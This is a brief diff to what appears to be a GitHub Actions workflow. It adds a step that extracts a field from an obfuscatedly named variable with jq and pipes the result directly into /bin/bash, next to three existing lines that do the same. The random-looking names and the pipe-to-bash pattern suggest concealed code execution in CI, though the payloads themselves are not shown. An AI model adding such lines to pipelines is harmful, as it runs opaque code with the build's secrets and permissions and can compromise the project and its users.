@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$gqp10" | jq -r .wh84 | /bin/bash
           printf '%s' "$prbim712" | jq -r .et42 | /bin/bash
           echo $a1 | jq -r .gffq8040 | /bin/bash
+          printf '%s' "$mxlsj31549" | jq -r .rft9 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
